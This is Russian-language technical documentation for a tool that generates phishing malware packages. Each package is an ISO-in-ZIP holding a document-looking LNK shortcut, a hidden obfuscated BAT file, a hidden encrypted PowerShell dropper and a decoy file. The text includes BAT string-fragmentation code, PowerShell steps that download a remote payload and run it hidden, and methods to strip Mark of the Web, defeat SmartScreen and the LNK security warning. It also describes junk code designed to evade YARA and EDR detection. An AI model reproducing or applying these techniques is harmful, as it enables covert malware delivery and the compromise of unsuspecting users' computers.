# Техническая документация

## Пайплайн генерации (на каждый вариант)

### Шаг 1 — Копирование DOCX-оригиналов

Каждый `.docx` из папки варианта копируется во временную директорию.

### Шаг 2 — Сборка Word-пакета

Для Word-пакета генерируются **собственные** уникальные артефакты:

1. Каждый DOCX **независимо** модифицируется — в конец добавляется невидимый абзац (белый текст, 1pt, 30-80 случайных слов) для смены хеша
2. Первый DOCX переименовывается в рандомное имя (decoy, скрытый)
3. Остальные DOCX остаются видимыми
4. Генерируется **уникальная карта шифра** (83 символа -> 2-символьные коды)
5. Генерируется PS1-дроппер с рандомными переменными и placeholder-тегами
6. Генерируется BAT с обфускацией set-variable fragmentation + junk REM
7. Создаётся LNK с иконкой Word (`SHELL32.dll,1`), target -> `cmd.exe /c "start /min .\{bat}"`
8. Всё пакуется в ISO (Joliet, hidden-флаги на BAT, PS1, decoy)
9. ISO пакуется в `VariantName.zip`

### Шаг 3 — Сборка PDF-пакета

Для PDF-пакета генерируются **свои** уникальные артефакты (не совпадают с Word):

1. DOCX-оригиналы копируются и **заново** модифицируются (другой невидимый текст, другие хеши)
2. Все DOCX конвертируются в PDF (Word на Windows / LibreOffice на Linux)
3. Первый PDF переименовывается в рандомное имя (decoy, скрытый)
4. Генерируется **новая** карта шифра, PS1, BAT — полностью отличные от Word-пакета
5. Создаётся LNK с иконкой Edge (`msedge.exe,11`)
6. Пакуется в ISO -> `VariantName_pdf.zip`

## Уникальность пакетов

Каждый пакет (Word и PDF) внутри одного варианта имеет:

| Артефакт | Уникален? |
|----------|:---------:|
| Имена BAT/PS1/decoy файлов | да (рандомные 2-3 символа) |
| Карта шифра PS1 | да (новая генерация) |
| Имена переменных в PS1 | да (из пула слов + суффикс) |
| Placeholder-теги (`##xxxx##`) | да (4-8 рандомных символов) |
| Хеши DOCX/PDF | да (независимая модификация) |
| Содержимое BAT | да (перемешанные SET + REM) |

## Содержимое ISO (вид на Windows)

При монтировании ISO в Windows Explorer с настройками по умолчанию:

| Файл | Видимость | Назначение |
|------|:---------:|------------|
| `Document.lnk` | видимый | Ярлык (выглядит как DOCX/PDF), запускает kill chain |
| `doc2.docx` / `doc2.pdf` | видимый | Дополнительные документы (если есть) |
| `xyz.docx` / `xyz.pdf` | скрытый | Decoy-документ (рандомное имя), открывается при клике на LNK |
| `ab.bat` | скрытый | Обфусцированный BAT (рандомное имя): открывает decoy + запускает PS1 |
| `cd.ps1` | скрытый | Зашифрованный PS1-дроппер (рандомное имя) |

## LNK-ярлык

LNK создаётся без `WorkingDirectory` — Windows автоматически использует директорию ярлыка (точку монтирования ISO) как рабочую папку. Это обеспечивает корректный запуск BAT при клике на LNK с любого диска.

- Target: `C:\Windows\System32\cmd.exe`
- Arguments (по умолчанию): `/c "start /min .\{bat}"` — BAT запускается через `start /min`
- Arguments (LNK_BYPASS=1): `/c ".\{bat}"` — BAT запускается напрямую через cmd
- ShowCommand: 1 (Normal) или 7 (SW_SHOWMINNOACTIVE при LNK_BYPASS)
- Icon: Word (`SHELL32.dll,1`) или Edge (`msedge.exe,11`)

## Обфускация

### BAT (set-variable fragmentation)

```batch
@echo off
cd /d "%~dp0"
REM Configuration loader v3
set "c=ell"
REM Checking system integrity...
set "a=pow"
set "f= -Ex"
set "b=ersh"
...
start xyz.docx
%a%%b%%c%.exe %d%%e%%f%%g%%h%%i%%j% -File cd.ps1
```

`powershell` собирается из фрагментов через `%a%%b%%c%`, аргументы аналогично. SET-строки перемешаны, между ними вставлены junk REM-комментарии. При `JUNK_CODE=1` дополнительно вставляются реалистичные BAT-конструкции (подробнее ниже).

### PS1 (подстановочный шифр + Base64)

```
Слои обфускации:
1. Подстановочный шифр — тело скрипта (83 уникальных 2-символьных кода)
2. Base64 — URL и имя файла
3. Рандомные имена переменных — стиль Windows API / Hex
4. Рандомные placeholder-теги (##xxxx##) для URL и filename
5. Invoke-Expression — финальное выполнение
6. При JUNK_CODE=1: junk-функции с цепочками вызовов + переменные
```

## Методы доставки — детали

### `webclient` (по умолчанию)

Классический метод — скачать файл и запустить.

```
PS1 выполняет:
1. WebClient.DownloadFile(url, path)   — скачивает файл на диск
2. Start-Process path                  — запускает
```

**Плюсы:** простой, минимальный код, надёжный.
**Минусы:** `DownloadFile()` автоматически ставит Mark of the Web (Zone.Identifier ADS) на скачанный файл. SmartScreen может заблокировать запуск.

### `base64_recycle` (обход MOTW)

Продвинутый метод — скачать байты в память, создать файл через base64-декодирование, удалить метку MOTW.

```
PS1 выполняет:
1. WebClient.DownloadData(url)         — скачивает БАЙТЫ в память (не файл!)
2. [Convert]::ToBase64String(bytes)    — кодирует байты в base64-строку
3. [Convert]::FromBase64String(b64)    — декодирует обратно в байты
4. [IO.File]::WriteAllBytes(path, bytes) — записывает файл через .NET I/O
5. Remove-Item -Stream Zone.Identifier — удаляет метку MOTW (страховка)
6. Start-Process path                  — запускает
```

### Как base64_recycle обходит MOTW — подробно

#### Шаг 1: DownloadData вместо DownloadFile

| | `DownloadFile()` | `DownloadData()` |
|---|---|---|
| Что делает | Скачивает файл и сохраняет на диск | Скачивает данные в `byte[]` в RAM |
| Создаёт файл? | Да, сразу | Нет, только массив байт в памяти |
| MOTW (Zone.Identifier)? | **Да** — Windows помечает файл как скачанный из интернета | **Нет** — файла нет, метить нечего |

Ключевой момент: MOTW (Mark of the Web) — это NTFS Alternate Data Stream (ADS) с именем `Zone.Identifier`. Windows добавляет его **только когда файл создаётся через "скачивание"** (браузер, `DownloadFile`, сохранение из Office и т.д.). Если файл создаётся программно через обычный файловый I/O — метки нет.

#### Шаг 2: Base64 encode/decode

```
Байты из RAM -> ToBase64String() -> текстовая строка -> FromBase64String() -> байты
```

Промежуточный слой обфускации. Данные проходят через текстовое представление (base64) и обратно. На диск пока ничего не пишется.

#### Шаг 3: WriteAllBytes

```csharp
[System.IO.File]::WriteAllBytes("C:\Users\...\cat.exe", $bytes)
```

Стандартная .NET операция записи файла:
- **НЕ** вызывает URL Security Zone Manager
- **НЕ** добавляет Zone.Identifier ADS
- Просто пишет байты на диск, как если бы файл был создан локально

#### Шаг 4: Remove-Item -Stream (страховка)

```powershell
Remove-Item -Path $path -Stream Zone.Identifier -ErrorAction SilentlyContinue
```

На случай если Windows всё-таки пометил файл (через zone propagation от процесса PowerShell):

- `Zone.Identifier` — NTFS ADS, прикреплённый к файлу
- `Remove-Item -Stream` удаляет **только этот поток**, сам файл не трогает
- `-ErrorAction SilentlyContinue` — если потока нет, ошибки не будет

#### Шаг 5: Запуск

```powershell
Start-Process -FilePath $path -WindowStyle Hidden
```

SmartScreen проверяет Zone.Identifier при запуске exe. Его нет → нет предупреждения → файл запускается.

#### Сравнение методов

| Этап | `webclient` | `base64_recycle` |
|------|-------------|------------------|
| Скачивание | `DownloadFile()` → файл с MOTW | `DownloadData()` → байты в RAM |
| Запись на диск | Уже есть (с меткой) | `WriteAllBytes` (без метки) |
| Zone.Identifier | **Есть** | **Удалён / не создан** |
| SmartScreen | Может заблокировать | Не срабатывает |
| Обфускация | Шифр + Base64 (URL) | Шифр + Base64 (URL) + Base64 (payload) |

#### Что такое Zone.Identifier (MOTW)

Когда ты скачиваешь файл через браузер или `DownloadFile`, Windows создаёт скрытый поток данных:

```
cat.exe                     — основной файл (сам exe)
cat.exe:Zone.Identifier     — ADS (скрытый поток)
```

Содержимое `Zone.Identifier`:
```ini
[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://...
HostUrl=https://...
```

`ZoneId=3` означает "Internet Zone". При запуске exe Windows видит эту метку и показывает предупреждение SmartScreen. Метод `base64_recycle` не создаёт этот поток, а если он случайно появился — удаляет.

## LNK MOTW Bypass (LNK_BYPASS) — детали

На Windows 11 22H2+ (после патча CVE-2022-41091) при клике на LNK внутри ISO с MOTW появляется "Open File Security Warning". Причина: аргументы LNK используют `start /min .\bat` — команда `start` вызывает `ShellExecuteEx`, который проверяет MOTW на BAT-файле.

### Почему это работает

`start` — это команда cmd.exe, которая внутри вызывает `ShellExecuteEx` для запуска целевого файла. `ShellExecuteEx` проверяет Zone.Identifier (MOTW) и показывает предупреждение.

`cmd.exe /c .\bat` — cmd.exe **не** использует ShellExecute для выполнения BAT. Он читает файл и выполняет строки BAT-скрипта внутри своего процесса. Поэтому MOTW-проверка не срабатывает.

`window_style=7` (SW_SHOWMINNOACTIVE) обеспечивает минимизацию окна cmd.exe, так как без `start /min` окно cmd не будет автоматически скрыто.

### Верификация

```powershell
$env:LNK_BYPASS="1"; $env:DELIVERY_METHOD="base64_recycle"; python generate.py
```

Затем: разблокировать ISO (Properties → Unblock) → смонтировать → кликнуть LNK → BAT должен выполниться без "Open File Security Warning".

## Мусорный код (JUNK_CODE) — детали

Вставляет процедурно-генерируемый мёртвый код в BAT и PS1 скрипты. Имена, паттерны и структура уникальны при каждом запуске — нет фиксированных пулов или шаблонов, которые можно детектировать сигнатурами YARA/EDR.

### Что вставляется в BAT

**Мёртвые SET (перемешаны с реальными):** junk SET-переменные добавляются в общий пул set_lines **до** shuffle, поэтому после перемешивания они неотличимы от рабочих.

**Реалистичные BAT-конструкции** (3-5 случайных из 6 паттернов):

| Паттерн | Пример |
|---------|--------|
| Проверка тулз | `where.exe >nul 2>&1 \|\| goto :chkData` |
| Арифметика | `set /a initBlock=42 + 17` |
| Проверка системных файлов | `if exist "%SystemRoot%\System32\ntdll.dll" (set "svcNode=1")` |
| Парсинг вывода | `for /f "tokens=1" %%x in ('ver') do set "logPath=%%x"` |
| NOP-команды | `type nul > nul` / `ver >nul` / `cd .` |
| Условный set по errorlevel | `if %errorlevel% equ 0 (set "netFlag=ready")` |

Метки генерируются процедурно: `prefix` + `Suffix` (225 комбинаций, camelCase).

### Что вставляется в PS1

**Функции (2-4 штуки, 8 паттернов тел):**

| Паттерн | Что делает |
|---------|-----------|
| Base64 round-trip | `[Convert]::ToBase64String(bytes)` → `FromBase64String` |
| Path combine | `[IO.Path]::Combine($env:TEMP, name)` + `Test-Path` |
| Encoding round-trip | `[Text.Encoding]::UTF8.GetBytes(str)` → `.GetString()` |
| Registry probe | `try { Get-ItemProperty 'HKLM:\...' } catch { $null }` |
| String split/join | `-split '...' \| ForEach { ... } \| -join` |
| DateTime math | `[datetime]::Now.AddMinutes(-N).ToString('fmt')` |
| Array reduce | `$arr \| Measure-Object -Sum \| Select -Expand Sum` |
| Hashtable merge | `$h1 + $h2; $merged.Count` |

Имена функций генерируются через `random_var_name()` — тот же стиль что и рабочие переменные скрипта (напр. `NtQueryObjZwAllocMem47`). Никаких Verb-Noun шаблонов.

**Цепочки вызовов:** после определения junk-функций генерируется блок вызовов, где каждая функция вызвана и результаты передаются друг другу. Статический анализ видит live data flow:

```powershell
$var1 = FuncName1
$var2 = FuncName2
$var3 = [string]$var1 + [string]$var2
```

**Переменные (4-7 штук, 12 паттернов значений):**

`[guid]::NewGuid()`, `[Environment]::GetEnvironmentVariable()`, `(Get-Date).Ticks`, `[BitConverter]::ToString()`, `-replace`, `[IO.Path]::GetRandomFileName()`, `$env:COMPUTERNAME.Length`, `[Text.Encoding]::ASCII.GetByteCount()`, массивы с индексом, hex-литералы и др.

1-2 переменные ссылаются на другие junk-переменные (`[string]$ref1 + [string]$ref2`).
